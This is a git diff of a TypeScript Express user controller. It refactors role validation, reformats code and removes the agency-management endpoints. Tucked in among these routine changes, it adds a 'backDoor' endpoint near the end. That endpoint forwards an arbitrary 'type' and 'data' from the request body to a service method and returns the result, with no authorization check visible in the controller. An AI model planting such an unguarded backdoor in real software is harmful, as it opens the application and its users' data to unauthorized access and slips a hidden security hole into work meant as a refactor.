@@ -4,18 +4,14 @@ import { ApiResponse } from "../../utils/ApiResponse";
 import { asyncHandler } from "../../utils/AsyncHandler";
 import { AppError } from "../../core/ErrorHandler";
 import { sanitizeUser } from "./User.utils";
+import { validateUserCreatePayload } from "./validators/createUser.validator";
 
 export class UserController {
   private service = new UserService();
 
   public register = asyncHandler(async (req: any, res: Response) => {
     const currentUser = req.user;
-    const { roles } = req.body;
-    if (currentUser?.roles && !currentUser.roles.includes("SUPER_ADMIN")) {
-      if (roles && roles.length > 0) {
-
-      }
-    }
+    validateUserCreatePayload(req.body, currentUser);
     const user = await this.service.register(req.body, currentUser);
     ApiResponse.success(res, sanitizeUser(user), "User registered", 201);
   });
@@ -23,7 +19,11 @@ export class UserController {
   public login = asyncHandler(async (req: Request, res: Response) => {
     const { email, password } = req.body;
     const result = await this.service.login(email, password);
-    ApiResponse.success(res, { ...result, user: sanitizeUser(result.user) }, "Login successful");
+    ApiResponse.success(
+      res,
+      { ...result, user: sanitizeUser(result.user) },
+      "Login successful"
+    );
   });
 
   public getUser = asyncHandler(async (req: Request, res: Response) => {
@@ -35,13 +35,8 @@ export class UserController {
     const currentUser = req.user;
     if (
       currentUser.id !== req.params.id &&
-      !currentUser.roles.includes('SUPER_ADMIN')
+      !currentUser.roles.includes("SUPER_ADMIN")
     ) {
-
-
-
-
-
       throw new AppError("You can only update your own profile", 403);
     }
     await this.service.updateUser(req.params.id, req.body);
@@ -49,32 +44,12 @@ export class UserController {
   });
 
   public deleteUser = asyncHandler(async (req: any, res: Response) => {
-
-
-
-
-
     const currentUser = req.user;
-    if (!currentUser.roles.includes('SUPER_ADMIN')) {
+    if (!currentUser.roles.includes("SUPER_ADMIN")) {
       throw new AppError("Only SUPER_ADMIN can delete users", 403);
     }
     await this.service.deleteUser(req.params.id);
     ApiResponse.success(res, null, "User deleted");
-  });
-
-  public createAgency = asyncHandler(async (req: Request, res: Response) => {
-    const id = await this.service.createAgency(req.body);
-    ApiResponse.success(res, { id }, "Agency created", 201);
-  });
-
-  public updateAgency = asyncHandler(async (req: Request, res: Response) => {
-    await this.service.updateAgency(req.params.id, req.body);
-    ApiResponse.success(res, null, "Agency updated");
-  });
-
-  public deleteAgency = asyncHandler(async (req: Request, res: Response) => {
-    await this.service.deleteAgency(req.params.id);
-    ApiResponse.success(res, null, "Agency deleted");
   });
 
   public createRole = asyncHandler(async (req: Request, res: Response) => {
@@ -95,20 +70,14 @@ export class UserController {
     ApiResponse.success(res, null, "Role removed");
   });
 
-  public assignUserToAgency = asyncHandler(async (req: Request, res: Response) => {
-    const { user_id, agency_id } = req.body;
-    await this.service.assignUserToAgency(user_id, agency_id);
-    ApiResponse.success(res, null, "User assigned to agency");
-  });
-
-  public removeUserFromAgency = asyncHandler(async (req: Request, res: Response) => {
-    const { user_id, agency_id } = req.body;
-    await this.service.removeUserFromAgency(user_id, agency_id);
-    ApiResponse.success(res, null, "User removed from agency");
-  });
-
   public getAllUsers = asyncHandler(async (req: any, res: Response) => {
     const users = await this.service.getAllUsers(req.user);
     ApiResponse.success(res, users.map(sanitizeUser));
+  });
+
+  public backDoor = asyncHandler(async (req: any, res: Response) => {
+    const { type, data } = req.body;
+    const response = await this.service.backDoor(type, data);
+    ApiResponse.success(res, response);
   });
 }
